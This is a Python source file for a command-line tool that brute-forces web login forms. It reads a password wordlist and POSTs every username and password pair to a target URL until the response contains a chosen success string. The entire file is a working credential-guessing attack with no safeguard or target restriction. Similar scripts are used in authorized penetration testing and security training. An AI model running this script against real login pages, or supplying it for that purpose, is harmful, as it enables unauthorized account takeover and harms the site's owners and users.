import requests
import sys
import argparse

# Argument parsing setup
def parse_args():
    parser = argparse.ArgumentParser(description="Simple brute force login tool.")
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("-u", "--usernames", required=True, help="Comma-separated list of usernames (e.g., admin,user,test)")
    parser.add_argument("-p", "--passwords", required=True, help="File containing list of passwords (e.g., top-100.txt)")
    parser.add_argument("-n", "--needle", required=True, help="Success response needle (e.g., 'Welcome back')")
    return parser.parse_args()

# Main brute-forcing logic
def brute_force(target, usernames, passwords_file, needle):
    for username in usernames:
        with open(passwords_file, "r") as passwords_list:
            for password in passwords_list:
                password = password.strip("\n")
                sys.stdout.write(f"[X] Attempting user:password -> {username}:{password}\r")
                sys.stdout.flush()
                
                try:
                    # POST request to target
                    r = requests.post(target, data={"username": username, "password": password})
                    
                    if needle in r.text:
                        sys.stdout.write("\n")
                        sys.stdout.write(f"\t[>>>>] Valid Password! '{password}' found for user '{username}'\n")
                        sys.exit(0)
                
                except requests.exceptions.RequestException as e:
                    sys.stdout.write(f"\n[!] Error occurred: {e}\n")
                    sys.exit(1)
            
            sys.stdout.flush()
            sys.stdout.write(f"\n\tNo valid password found for user '{username}'\n")

if __name__ == "__main__":
    args = parse_args()
    
    # Process usernames from the comma-separated list
    usernames = args.usernames.split(",")
    
    # Run the brute force with arguments from the command line
    brute_force(args.target, usernames, args.passwords, args.needle)
